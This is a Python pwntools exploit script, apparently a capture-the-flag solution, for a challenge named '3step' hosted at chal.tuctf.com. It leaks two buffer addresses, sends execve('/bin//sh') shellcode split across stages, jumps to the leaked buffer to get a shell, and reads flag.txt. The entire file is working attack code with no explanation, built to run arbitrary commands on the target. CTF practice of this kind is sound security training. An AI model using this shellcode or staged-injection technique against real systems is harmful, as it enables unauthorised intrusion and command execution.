from pwn import *

#r = process("./3step")
r = remote("chal.tuctf.com", 30504)

context.terminal = ["tmux", "splitw", "-v"]
#gdb.attach(r)

r.recvuntil("Try out complimentary snacks\n")

buf1 = int(r.recvline().strip(), 16)
buf2 = int(r.recvline().strip(), 16)

log.info("buf1: {}".format(hex(buf1)))
log.info("buf2: {}".format(hex(buf2)))

r.recv()

payload = "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\x31\xd2\xcd\x80"
r.sendline(payload)

r.recv()

payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
payload += asm("mov edx, " + str(hex(buf1)))
payload += asm("jmp edx")
r.sendline(payload)

r.recv()

payload = p32(buf2)
r.sendline(payload)

r.sendline("cat flag.txt")
print(r.recv())
